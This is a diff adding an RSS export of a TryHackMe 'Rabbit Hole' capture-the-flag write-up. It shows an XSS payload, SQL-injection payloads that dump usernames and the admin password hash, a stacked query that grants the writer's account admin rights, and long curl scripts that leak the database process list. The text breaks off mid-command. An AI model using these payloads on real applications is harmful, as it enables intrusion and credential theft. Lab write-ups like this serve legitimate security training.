@@ -1,0 +1,196 @@
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Rabbit Hole]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>lib/media/favicon.png</url><title>Rabbit Hole</title><link></link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Sun, 17 Nov 2024 10:52:41 GMT</lastBuildDate><atom:link href="lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Sun, 17 Nov 2024 10:52:40 GMT</pubDate><ttl>60</ttl><dc:creator></dc:creator><item><title><![CDATA[Rabbit Hole]]></title><description><![CDATA[ 
+ <br>by <a data-tooltip-position="top" aria-label="https://tryhackme.com/p/tryhackme" rel="noopener nofollow" class="external-link" href="https://tryhackme.com/p/tryhackme" target="_blank">TryHackMe</a> and <a data-tooltip-position="top" aria-label="https://tryhackme.com/p/shamollash" rel="noopener nofollow" class="external-link" href="https://tryhackme.com/p/shamollash" target="_blank">shamollash</a><br><img alt="Pasted image 20241116211332.png" src="pasted-image-20241116211332.png"><br>
+It's easy to fall into rabbit holes.<br>Room Link: <a rel="noopener nofollow" class="external-link" href="https://tryhackme.com/r/room/rabbitholeqq" target="_blank">https://tryhackme.com/r/room/rabbitholeqq</a><br><br>
+<br>IP Address: 10.10.43.190
+<br><br>First off, let's perform a nmap scan on the target system<br>sudo nmap -sC -sV -vv -oA RabbitHole.nmap 10.10.43.190
+<br><img alt="Pasted image 20241116212448.png" src="pasted-image-20241116212448.png"><br>Here, we see that we have two ports open in our target system<br>
+<br>Port 22
+<br>Port 80
+<br>So, let's add the IP address and assign a domain name to the target system from the /etc/hosts file.<br>10.10.43.190 rabbithole.thm
+<br><img alt="Pasted image 20241116212748.png" src="pasted-image-20241116212748.png"><br>Now, let's access the web page. Here we see a page asking us to Register and then login into the application from the given links.<br><img alt="Pasted image 20241116212829.png" src="pasted-image-20241116212829.png"><br><br>On the Registering page, we are received with a note of presence of anti-bruteforce measures.<br><img alt="Pasted image 20241116215349.png" src="pasted-image-20241116215349.png"><br>Here, register a user and then click on the login link for the login page.<br><br>On the Login page, we get a slightly different note saying the There are anti-bruteforce measures in place, implemented with database queries.<br><img alt="Pasted image 20241116215640.png" src="pasted-image-20241116215640.png"><br>now, using the same login credentials that you registered with, login into application.<br><img alt="Pasted image 20241117071617.png" src="pasted-image-20241117071617.png"><br><br>Here, we see our username being displaced on the application's page, this leaves us with a doubt of having a XSS in the username field. Therefor, now, let's create a username with the following payload and then login with that same user.<br>&lt;script&gt;alert("Hacker is Here")&lt;/script&gt;
+<br><img alt="Pasted image 20241117071925.png" src="pasted-image-20241117071925.png"><br><img alt="Pasted image 20241117072242.png" src="pasted-image-20241117072242.png"><br>And for sure!!! After we login, we see our Alert message being displayed to us.<br><img alt="Pasted image 20241117072124.png" src="pasted-image-20241117072124.png"><br>Also, in the username field, we see an error being displayed about the SQL query.<br><img alt="Pasted image 20241117072144.png" src="pasted-image-20241117072144.png"><br><br>Now, to perform the SQL Injection exploit, we need to create a user with our SQL payload.<br>In the register page, let's create a username with the following payload of SQL for analyzing the number of columns that our current database has.<br>/"UNION SELECT 1 -- -
+<br><img alt="Pasted image 20241117074357.png" src="pasted-image-20241117074357.png"><br>Now, with the same username, login into the application. Here we get no result.<br><img alt="Pasted image 20241117074500.png" src="pasted-image-20241117074500.png"><br>let's try with more number of columns.<br>/"UNION SELECT 1,2 -- -
+<br><img alt="Pasted image 20241117074637.png" src="pasted-image-20241117074637.png"><br>And here we get the number of columns that our database currently has. Fine, now, let's enumerate the database that we are working on.<br>/" UNION SELECT 1, table_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema=DATABASE() -- 
+<br><img alt="Pasted image 20241117080009.png" src="pasted-image-20241117080009.png"><br>Here, we get the two tables that is present in our current working database.<br>Now, let's enumerate the  users table to identify the column names.<br>/" UNION SELECT 1,SUBSTRING((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = database() and table_name ='users'), 1, 16)-- -
+<br>This will only fetch the first 16 characters of the result.<br><img alt="Pasted image 20241117080828.png" src="pasted-image-20241117080828.png"><br>Now, let's get the reset of the result.<br>/" UNION SELECT 1,SUBSTRING((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = database() and table_name ='users'), 17, 16)-- -
+<br><img alt="Pasted image 20241117081016.png" src="pasted-image-20241117081016.png"><br>So, we have the following databases.<br>id, username, password, group
+<br>Now, let's enumerate the usernames from the databse.<br>/" UNION SELECT 1,`username` FROM users -- -
+<br><img alt="Pasted image 20241117081414.png" src="pasted-image-20241117081414.png"><br>So, we have the following users in the users table<br>admin
+foo
+bar
+Hacker
+<br>So, now, let's enumerate password of these users.<br><br>/" UNION SELECT 1,SUBSTRING((SELECT group_concat(password) FROM users WHERE username='admin'), 1, 16) -- -
+<br>/" UNION SELECT 1,SUBSTRING((SELECT group_concat(password) FROM users WHERE username='admin'), 17, 16) -- -
+<br><img alt="Pasted image 20241117081728.png" src="pasted-image-20241117081728.png"><br><img alt="Pasted image 20241117081848.png" src="pasted-image-20241117081848.png"><br>This hash does not match any of the password from the rockyou text file using hash cat.<br>hashcat -m0 -a0 '&lt;--HASH--&gt;' ~/Pranava__Rao/Tools/Fuzzing\ List/rockyou.txt
+<br><img alt="Pasted image 20241117093941.png" src="pasted-image-20241117093941.png"><br>Let us now assign the admin access to the Hacker user (the user which we had created).<br>\" UNION SELECT 1,2; UPDATE users SET group = 'admin' WHERE username = 'Hacker';
+<br><img alt="Pasted image 20241117094908.png" src="pasted-image-20241117094908.png"><br><img alt="Pasted image 20241117102744.png" src="pasted-image-20241117102744.png"><br>Now, the fact that we see the admin user logging in every minute.... makes me curious of there is any background process which is logging in with the admin user's account into the application.<br>(From this point of the write-up, a bit of help and knowledge was acquired from <a data-tooltip-position="top" aria-label="https://0xb0b.gitbook.io/writeups/tryhackme/2024/rabbit-hole" rel="noopener nofollow" class="external-link" href="https://0xb0b.gitbook.io/writeups/tryhackme/2024/rabbit-hole" target="_blank">0xb0b's writeup</a> on this room, therefor, all the credits and appreciations goes to the blog. Please go read the Blog for more information. Thank you :) )<br>Direct link: <a data-tooltip-position="top" aria-label="https://0xb0b.gitbook.io/writeups/tryhackme/2024/rabbit-hole#processlist" rel="noopener nofollow" class="external-link" href="https://0xb0b.gitbook.io/writeups/tryhackme/2024/rabbit-hole#processlist" target="_blank">Rabbit Hole</a><br>From the blog, we get few files which is really useful for the process of automation of finding the password of the admin user from the backend of the application.<br>
+(For more information about the script, you can read through the blog or watch this video: )<br>adapt the SUBSTRING Parameter to create different users, targeting different blocks:<br>reg.sh<br>#!/bin/bash
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/register.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=1' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 1, 16) -- -&amp;password=asdf&amp;submit=Submit+Query' \
+    $'http://rabbithole.thm/register.php'
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/register.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=1' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 17, 16) -- -&amp;password=asdf&amp;submit=Submit+Query' \
+    $'http://rabbithole.thm/register.php'
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/register.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=1' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 33, 16) -- -&amp;password=asdf&amp;submit=Submit+Query' \
+    $'http://rabbithole.thm/register.php'
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/register.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=1' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 49, 16) -- -&amp;password=asdf&amp;submit=Submit+Query' \
+    $'http://rabbithole.thm/register.php'
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/register.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=1' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 65, 16) -- -&amp;password=asdf&amp;submit=Submit+Query' \
+    $'http://rabbithole.thm/register.php'
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/register.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=1' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 81, 16) -- -&amp;password=asdf&amp;submit=Submit+Query' \
+    $'http://rabbithole.thm/register.php'
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/register.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=1' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 97, 16) -- -&amp;password=asdf&amp;submit=Submit+Query' \
+    $'http://rabbithole.thm/register.php'
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/register.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=1' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 113, 16) -- -&amp;password=asdf&amp;submit=Submit+Query' \
+    $'http://rabbithole.thm/register.php'
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/register.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=1' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 129, 16) -- -&amp;password=asdf&amp;submit=Submit+Query' \
+    $'http://rabbithole.thm/register.php'
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/register.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=1' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 145, 16) -- -&amp;password=asdf&amp;submit=Submit+Query' \
+    $'http://rabbithole.thm/register.php'
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/register.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=1' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 161, 16) -- -&amp;password=asdf&amp;submit=Submit+Query' \
+    $'http://rabbithole.thm/register.php'
+    
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/register.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=1' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 177, 16) -- -&amp;password=asdf&amp;submit=Submit+Query' \
+    $'http://rabbithole.thm/register.php'
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/register.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=1' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 193, 16) -- -&amp;password=asdf&amp;submit=Submit+Query' \
+    $'http://rabbithole.thm/register.php'
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/register.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=1' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 209, 16) -- -&amp;password=asdf&amp;submit=Submit+Query' \
+    $'http://rabbithole.thm/register.php'
+
+<br> reg.sh<br>Now, run the reg.sh file<br>chmod +x reg.sh
+<br>./reg.sh
+<br><img alt="Pasted image 20241117113435.png" src="pasted-image-20241117113435.png"><br>Now we need to log in with the users. This could also be done using the following script:<br>login.sh<br>#!/bin/bash
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 197' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=1' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 1, 16) -- -&amp;password=asdf&amp;login=Submit+Query' \
+    $'http://rabbithole.thm/login.php'  
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=2' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 17, 16) -- -&amp;password=asdf&amp;login=Submit+Query' \
+    $'http://rabbithole.thm/login.php'  
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=3' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 33, 16) -- -&amp;password=asdf&amp;login=Submit+Query' \
+    $'http://rabbithole.thm/login.php'
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=4' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 49, 16) -- -&amp;password=asdf&amp;login=Submit+Query' \
+    $'http://rabbithole.thm/login.php'
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=5' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 65, 16) -- -&amp;password=asdf&amp;login=Submit+Query' \
+    $'http://rabbithole.thm/login.php'    
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=6' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 81, 16) -- -&amp;password=asdf&amp;login=Submit+Query' \
+    $'http://rabbithole.thm/login.php'    
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=7' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 97, 16) -- -&amp;password=asdf&amp;login=Submit+Query' \
+    $'http://rabbithole.thm/login.php'    
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 199' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=8' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 113, 16) -- -&amp;password=asdf&amp;login=Submit+Query' \
+    $'http://rabbithole.thm/login.php'    
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 199' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=9' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 129, 16) -- -&amp;password=asdf&amp;login=Submit+Query' \
+    $'http://rabbithole.thm/login.php'    
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 199' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=10' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 145, 16) -- -&amp;password=asdf&amp;login=Submit+Query' \
+    $'http://rabbithole.thm/login.php'    
+curl -i -s -k -X $'POST' \
